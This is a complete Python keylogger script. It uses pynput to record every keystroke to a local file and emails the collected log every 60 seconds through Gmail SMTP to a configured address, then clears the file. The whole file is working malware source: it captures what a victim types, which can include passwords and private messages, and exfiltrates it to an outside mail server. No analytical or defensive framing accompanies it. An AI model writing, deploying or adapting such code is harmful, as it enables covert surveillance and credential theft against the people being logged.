import smtplib
import time
import os
from pynput import keyboard

# ========== CONFIGURATION ==========
LOG_FILE = "keylog.txt"  # File to store keystrokes
EMAIL = "your_email@gmail.com"  # Change this to your email
PASSWORD = "your_password"  # Change this to your email password
SEND_INTERVAL = 60  # Time (in seconds) to send logs via email

#----------------------------------------------------------------------------#
def send_email():
    try:
        with open(LOG_FILE, "r") as file:
            log_data = file.read()

        if log_data:  
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL, PASSWORD)
            server.sendmail(EMAIL, EMAIL, f"Subject: Keylogger Log\n\n{log_data}")
            server.quit()
            open(LOG_FILE, "w").close()  
    except Exception as e:
        print(f"Email error: {e}")

def on_press(key):
    try:
        with open(LOG_FILE, "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            else:
                file.write(f" [{key}] ") 
    except Exception as e:
        print(f"Error: {e}")

listener = keyboard.Listener(on_press=on_press)
listener.start()

while True:
    time.sleep(SEND_INTERVAL)
    send_email()
